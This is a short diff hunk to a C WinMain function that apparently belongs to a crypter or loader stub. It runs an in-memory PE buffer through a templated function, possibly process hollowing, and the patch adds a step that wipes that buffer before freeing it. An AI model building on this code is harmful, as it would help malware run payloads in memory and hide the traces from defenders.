@@ -773,6 +773,7 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
     g_VF(compressed,0,MEM_RELEASE);
     if (!stub_pe) return 1;
     {{fnHol}}(stub_pe,g_org_size);
+    SecureZeroMemory(stub_pe,g_org_size);
     g_VF(stub_pe,0,MEM_RELEASE);
     return 0;
 }
